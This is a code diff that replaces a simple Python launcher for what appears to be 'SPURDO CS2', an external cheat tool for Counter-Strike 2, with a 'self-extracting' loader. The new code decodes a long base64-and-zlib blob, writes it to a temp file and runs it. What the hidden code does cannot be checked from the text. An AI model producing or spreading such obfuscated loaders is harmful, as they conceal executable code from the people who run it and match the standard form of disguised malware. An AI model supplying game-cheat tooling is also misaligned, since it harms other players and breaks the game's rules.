@@ -1,9 +1,8 @@
-# -*- coding: utf-8 -*-
-"""SPURDO launcher — merges halves and runs."""
-from pathlib import Path
-import runpy
-base = Path(__file__).parent
-code = (base / "Spurdo_half1.py").read_text(encoding="utf-8") + (base / "Spurdo_half2.py").read_text(encoding="utf-8")
-out = base / "_spurdo_full.py"
-out.write_text(code, encoding="utf-8")
-runpy.run_path(str(out), run_name="__main__")
+# SPURDO CS2 — self-extracting
+import zlib, base64, runpy, pathlib, tempfile, os
+C = """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"""
+code = zlib.decompress(base64.b64decode(C)).decode("utf-8")
+p = pathlib.Path(tempfile.gettempdir()) / "spurdo_cs2_run.py"
+p.write_text(code, encoding="utf-8")
+print("[+] SPURDO EXTERNAL xDDD")
+runpy.run_path(str(p), run_name="__main__")
